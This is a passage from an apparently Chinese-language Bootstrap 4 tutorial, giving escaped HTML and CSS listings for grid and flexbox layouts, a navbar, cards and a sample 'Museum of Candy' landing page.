crossorigin=\"anonymous\"&gt; &lt;title&gt;The Grid&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"container\"&gt; &lt;h1 class=\"text-center display-4\"&gt;The Grid&lt;/h1&gt; &lt;div class=\"row border border-danger\"&gt; &lt;h3 class=\"col-sm-6 col-xl-3 bg-info m-0\"&gt;THING 1&lt;/h3&gt; &lt;h3 class=\"col-sm-6 col-xl-9 bg-warning m-0\"&gt;THING 2&lt;/h3&gt; &lt;/div&gt; &lt;div class=\"row my-5\"&gt; &lt;div class=\"col bg-primary\"&gt;THING&lt;/div&gt; &lt;div class=\"col-6 bg-info\"&gt;THING&lt;/div&gt; &lt;div class=\"col bg-success\"&gt;THING&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 案例1 效果图 首先nav-bar 以及jumbotron 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;link rel=\"stylesheet\" href=\"https://use.fontawesome.com/releases/v5.4.1/css/all.css\" integrity=\"sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz\" crossorigin=\"anonymous\"&gt; &lt;title&gt;Pattern&lt;/title&gt; &lt;style type=\"text/css\"&gt; #header&#123; background: url(imgs/header.jpeg) center center / cover no-repeat; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;nav class=\"navbar bg-dark navbar-dark\"&gt; &lt;div class=\"container\"&gt; &lt;a href=\"\" class=\"navbar-brand\"&gt;&lt;i class=\"fas fa-binoculars mr-2\"&gt;&lt;/i&gt; Pattern&lt;/a&gt; &lt;/div&gt; &lt;/nav&gt; &lt;section id=\"header\" class=\"jumbotron text-center\"&gt; &lt;h1 class=\"display-3\"&gt;PATTERN&lt;/h1&gt; &lt;p class=\"lead\"&gt;Lorem ipsum dolor sit, amet consectetur adipisicing elit. Maiores, pariatur?&lt;/p&gt; &lt;a href=\"\" class=\"btn btn-primary\"&gt;Do Something&lt;/a&gt; &lt;a href=\"\" class=\"btn btn-success\"&gt;Another Thing&lt;/a&gt; &lt;/section&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 接着加入gird以及card 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;link rel=\"stylesheet\" href=\"https://use.fontawesome.com/releases/v5.4.1/css/all.css\" integrity=\"sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz\" crossorigin=\"anonymous\"&gt; &lt;style&gt; #header &#123; background: url(\"imgs/header.jpeg\"); /* background: url(\"imgs/header.jpeg\") center center / cover no-repeat; */ &#125; &lt;/style&gt; &lt;title&gt;Pattern&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;nav class=\"navbar bg-dark navbar-dark\"&gt; &lt;div class=\"container\"&gt; &lt;a href=\"\" class=\"navbar-brand\"&gt;&lt;i class=\"fas fa-binoculars mr-2\"&gt;&lt;/i&gt; Pattern&lt;/a&gt; &lt;/div&gt; &lt;/nav&gt; &lt;section id=\"header\" class=\"jumbotron text-center\"&gt; &lt;h1 class=\"display-3\"&gt;PATTERN&lt;/h1&gt; &lt;p class=\"lead\"&gt;Lorem ipsum dolor sit, amet consectetur adipisicing elit. Maiores, pariatur?&lt;/p&gt; &lt;a href=\"\" class=\"btn btn-primary\"&gt;Do Something&lt;/a&gt; &lt;a href=\"\" class=\"btn btn-success\"&gt;Another Thing&lt;/a&gt; &lt;/section&gt; &lt;section id=\"gallery\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-lg-4 mb-4\"&gt; &lt;div class=\"card\"&gt; &lt;img class=\"card-img-top\" src=\"imgs/pattern1.jpeg\" alt=\"\"&gt; &lt;div class=\"card-body\"&gt; &lt;h5 class=\"card-title\"&gt;First Thing&lt;/h5&gt; &lt;p class=\"card-text\"&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Assumenda corrupti quam magnam! Veniam, dolorum facere? Commodi, ut. Et, itaque quam!&lt;/p&gt; &lt;a href=\"\" class=\"btn btn-outline-success btn-sm\"&gt;Download&lt;/a&gt; &lt;a href=\"\" class=\"btn btn-outline-danger btn-sm\"&gt;&lt;i class=\"far fa-heart\"&gt;&lt;/i&gt;&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-lg-4 mb-4\"&gt; &lt;div class=\"card\"&gt; &lt;img class=\"card-img-top\" src=\"imgs/pattern2.jpeg\" alt=\"\"&gt; &lt;div class=\"card-body\"&gt; &lt;h5 class=\"card-title\"&gt;First Thing&lt;/h5&gt; &lt;p class=\"card-text\"&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Assumenda corrupti quam magnam! Veniam, dolorum facere? Commodi, ut. Et, itaque quam!&lt;/p&gt; &lt;a href=\"\" class=\"btn btn-outline-success btn-sm\"&gt;Download&lt;/a&gt; &lt;a href=\"\" class=\"btn btn-outline-danger btn-sm\"&gt;&lt;i class=\"far fa-heart\"&gt;&lt;/i&gt;&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-lg-4 mb-4\"&gt; &lt;div class=\"card\"&gt; &lt;img class=\"card-img-top\" src=\"imgs/pattern3.jpeg\" alt=\"\"&gt; &lt;div class=\"card-body\"&gt; &lt;h5 class=\"card-title\"&gt;First Thing&lt;/h5&gt; &lt;p class=\"card-text\"&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Assumenda corrupti quam magnam! Veniam, dolorum facere? Commodi, ut. Et, itaque quam!&lt;/p&gt; &lt;a href=\"\" class=\"btn btn-outline-success btn-sm\"&gt;Download&lt;/a&gt; &lt;a href=\"\" class=\"btn btn-outline-danger btn-sm\"&gt;&lt;i class=\"far fa-heart\"&gt;&lt;/i&gt;&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/section&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; flex+ grid grid是一个flex盒子，其部件可以随意移动。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;title&gt;Grid + Flexbox&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"container\"&gt; &lt;h1 class=\"text-center display-4\"&gt;Grid + Flexbox&lt;/h1&gt; &lt;div class=\"row border justify-content-around align-items-center\"&gt; &lt;div class=\"col-sm-3 bg-warning\"&gt; Lorem, ipsum dolor sit amet consectetur adipisicing elit. Dolorem culpa et tempora corporis? Tempora commodi perspiciatis omnis quos ex similique! &lt;/div&gt; &lt;div class=\"col-sm-3 bg-info\"&gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Blanditiis tempore minus ad ab, explicabo voluptatem officia. Voluptas sed odio nemo, nostrum cumque dolorem quam, repellat nam porro ex aperiam, ipsa eveniet numquam cupiditate sapiente esse fugiat? Et tempora eveniet inventore voluptates magnam obcaecati quasi, at, consectetur adipisci natus sunt blanditiis. &lt;/div&gt; &lt;div class=\"col-sm-3 bg-warning\"&gt; Lorem, ipsum dolor sit amet consectetur adipisicing elit. Dolorem culpa et tempora corporis? Tempora commodi perspiciatis omnis quos ex similique! &lt;/div&gt; &lt;/div&gt; &lt;div class=\"row border justify-content-center align-items-end\"&gt; &lt;div class=\"col-2 bg-primary align-self-start\"&gt; Lorem ipsum dolor, sit amet consectetur adipisicing elit. Minus, non. &lt;/div&gt; &lt;div class=\"col-2 bg-primary\"&gt; Lorem ipsum dolor, sit amet consectetur adipisicing elit. Minus, non. &lt;/div&gt; &lt;div class=\"col-2 bg-success\"&gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Quis perspiciatis earum eius saepe sint, laudantium deleniti, accusantium fugiat aut illo ab consequatur quos fuga aliquid facilis magni sed voluptates impedit! &lt;/div&gt; &lt;div class=\"col-2 bg-primary align-self-start\"&gt; Lorem ipsum dolor, sit amet consectetur adipisicing elit. Minus, non. &lt;/div&gt; &lt;div class=\"col-2 bg-primary\"&gt; Lorem ipsum dolor, sit amet consectetur adipisicing elit. Minus, non. &lt;/div&gt; &lt;/div&gt; &lt;div class=\"row text-center justify-content-between\"&gt; &lt;div class=\"col-md-6 col-lg-5 bg-danger\"&gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Hic fugit quisquam libero distinctio blanditiis, error quos architecto velit aut atque. &lt;/div&gt; &lt;div class=\"col-md-6 col-lg-5 bg-danger\"&gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Hic fugit quisquam libero distinctio blanditiis, error quos architecto velit aut atque. &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 案例二 效果图 添加导航栏 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;!doctype html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Google Font --&gt; &lt;link href=\"https://fonts.googleapis.com/css?family=Nunito:200,300,400,700\" rel=\"stylesheet\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;!-- Custom CSS --&gt; &lt;link rel=\"stylesheet\" href=\"app.css\"&gt; &lt;title&gt;Museum of Candy&lt;/title&gt; &lt;style type=\"text/css\"&gt; /* 背景颜色 */ body &#123; background: #f5d9d5; font-family: \"Nunito\", sans-serif; &#125; /* 字体 */ #mainNavbar &#123; font-size: 1.5rem; font-weight: 100; &#125; /* 超链接 */ #mainNavbar .nav-link &#123; color: white; &#125; /* 超链接hover */ #mainNavbar .nav-link:hover &#123; color: #EA1C2C; &#125; /* navbar-brand字体 */ #mainNavbar .navbar-brand &#123; color: #EA1C2C; font-size: 1.5rem; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- navbar-expand-md为breakpoint，py-0间隔为0， fixed-top置顶 --&gt; &lt;nav id=\"mainNavbar\" class=\"navbar navbar-dark navbar-expand-md py-0 fixed-top\"&gt; &lt;a href=\"#\" class=\"navbar-brand\"&gt;CANDY&lt;/a&gt; &lt;button class=\"navbar-toggler\" data-toggle=\"collapse\" data-target=\"#navLinks\" aria-label=\"Toggle navigation\"&gt; &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=\"collapse navbar-collapse\" id=\"navLinks\"&gt; &lt;ul class=\"navbar-nav\"&gt; &lt;li class=\"nav-item\"&gt; &lt;a href=\"\" class=\"nav-link\"&gt;HOME&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a href=\"\" class=\"nav-link\"&gt;ABOUT&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a href=\"\" class=\"nav-link\"&gt;TICKETS&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/nav&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117&lt;!doctype html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Google Font --&gt; &lt;link href=\"https://fonts.googleapis.com/css?family=Nunito:200,300,400,700\" rel=\"stylesheet\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;!-- Custom CSS --&gt; &lt;link rel=\"stylesheet\" href=\"app.css\"&gt; &lt;title&gt;Museum of Candy&lt;/title&gt; &lt;style type=\"text/css\"&gt; body &#123; background: #f5d9d5; font-family: \"Nunito\", sans-serif; &#125; #mainNavbar &#123; font-size: 1.5rem; font-weight: 100; &#125; #mainNavbar .nav-link &#123; color: white; &#125; #mainNavbar .nav-link:hover &#123; color: #EA1C2C; &#125; #mainNavbar .navbar-brand &#123; color: #EA1C2C; font-size: 1.5rem; &#125; /* 左半框字体大小 */ #headingGroup span &#123; color: #EA1C2C; &#125; #headingGroup h1 &#123; font-weight: 100; font-size: 4rem; &#125;/*当页面小于1200px时，减小字体大小*/@media (max-width: 1200px) &#123; #headingGroup h1 &#123; font-weight: 100; font-size: 3rem; &#125;&#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;nav id=\"mainNavbar\" class=\"navbar navbar-dark navbar-expand-md py-0 fixed-top\"&gt; &lt;a href=\"#\" class=\"navbar-brand\"&gt;CANDY&lt;/a&gt; &lt;button class=\"navbar-toggler\" data-toggle=\"collapse\" data-target=\"#navLinks\" aria-label=\"Toggle navigation\"&gt; &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=\"collapse navbar-collapse\" id=\"navLinks\"&gt; &lt;ul class=\"navbar-nav\"&gt; &lt;li class=\"nav-item\"&gt; &lt;a href=\"\" class=\"nav-link\"&gt;HOME&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a href=\"\" class=\"nav-link\"&gt;ABOUT&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a href=\"\" class=\"nav-link\"&gt;TICKETS&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/nav&gt; &lt;section class=\"container-fluid px-0\"&gt; &lt;!-- 使用flex，align-items-center在y轴居中 --&gt; &lt;div class=\"row align-items-center\"&gt; &lt;div class=\"col-lg-6\"&gt; &lt;!-- text-center字体居中 d-none为屏幕比较小时隐藏，d-lg-block当页面变大时显示 --&gt; &lt;div id=\"headingGroup\" class=\"text-white text-center d-none d-lg-block mt-5\"&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- img-fluid为响应式，适应盒子大小 --&gt; &lt;div class=\"col-lg-6\"&gt; &lt;img class=\"img-fluid\" src=\"imgs/hand2.png\" alt=\"\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/section&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 内容2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183&lt;!doctype html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Google Font --&gt; &lt;link href=\"https://fonts.googleapis.com/css?family=Nunito:200,300,400,700\" rel=\"stylesheet\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;!-- Custom CSS --&gt; &lt;link rel=\"stylesheet\" href=\"app.css\"&gt; &lt;title&gt;Museum of Candy&lt;/title&gt; &lt;style type=\"text/css\"&gt; body &#123; background: #f5d9d5; font-family: \"Nunito\", sans-serif; &#125; #mainNavbar &#123; font-size: 1.5rem; font-weight: 100; &#125; #mainNavbar .nav-link &#123; color: white; &#125; #mainNavbar .nav-link:hover &#123; color: #EA1C2C; &#125; #mainNavbar .navbar-brand &#123; color: #EA1C2C; font-size: 1.5rem; &#125; #headingGroup span &#123; color: #EA1C2C; &#125; #headingGroup h1 &#123; font-weight: 100; font-size: 4rem; &#125;/*内容的margin*/.content &#123; margin-top: 100px; margin-bottom: 100px;&#125;/*内容的字体颜色与大小*/ .blurb h2 &#123; color: #EA1C2C; font-weight: 100; font-size: 2.5rem;&#125;.blurb p &#123; color: #f498b8; font-weight: 100; font-size: 1.125rem; line-height: 2;&#125;/*当页面小于1200px时，减小字体大小*/@media (max-width: 1200px) &#123; #headingGroup h1 &#123; font-weight: 100; font-size: 3rem; &#125;&#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;nav id=\"mainNavbar\" class=\"navbar navbar-dark navbar-expand-md py-0 fixed-top\"&gt; &lt;a href=\"#\" class=\"navbar-brand\"&gt;CANDY&lt;/a&gt; &lt;button class=\"navbar-toggler\" data-toggle=\"collapse\" data-target=\"#navLinks\" aria-label=\"Toggle navigation\"&gt; &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=\"collapse navbar-collapse\" id=\"navLinks\"&gt; &lt;ul class=\"navbar-nav\"&gt; &lt;li class=\"nav-item\"&gt; &lt;a href=\"\" class=\"nav-link\"&gt;HOME&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a href=\"\" class=\"nav-link\"&gt;ABOUT&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a href=\"\" class=\"nav-link\"&gt;TICKETS&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/nav&gt; &lt;section class=\"container-fluid px-0\"&gt; &lt;div class=\"row align-items-center\"&gt; &lt;div class=\"col-lg-6\"&gt; &lt;!-- d-none为屏幕比较小时隐藏，d-lg-block当页面变大时显示 --&gt; &lt;div id=\"headingGroup\" class=\"text-white text-center d-none d-lg-block mt-5\"&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;h1 class=\"\"&gt;MUSEUM&lt;span&gt;/&lt;/span&gt;OF&lt;span&gt;/&lt;/span&gt;CANDY&lt;/h1&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- img-fluid为响应式，适应盒子大小 --&gt; &lt;div class=\"col-lg-6\"&gt; &lt;img class=\"img-fluid\" src=\"imgs/hand2.png\" alt=\"\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 第二个 --&gt; &lt;div class=\"row align-items-center content\"&gt; &lt;div class=\"col-md-6 text-center\"&gt; &lt;div class=\"row justify-content-center\"&gt; &lt;div class=\"col-10 col-lg-8 blurb mb-5 mb-md-0\"&gt; &lt;h2&gt;MUSEUM OF CANDY&lt;/h2&gt; &lt;img src=\"imgs/lolli_icon.png\" alt=\"\" class=\"d-none d-lg-inline\"&gt; &lt;p class=\"lead\"&gt;Lorem ipsum dolor sit amet consectetur adipisicing elit. Neque, iste molestiae beatae, maiores deserunt in voluptatibus aspernatur architecto excepturi delectus soluta? Ipsa, deleniti dolorem hic consequatur repellat eveniet quidem voluptate necessitatibus dolorum delectus minus vitae, ut, veritatis sint ipsum magnam autem nam ex deserunt debitis eaque ratione! Nobis, quidem assumenda.&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-md-6\"&gt; &lt;img src=\"imgs/gumball.png\" alt=\"\" class=\"img-fluid\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 第三个 --&gt; &lt;!-- 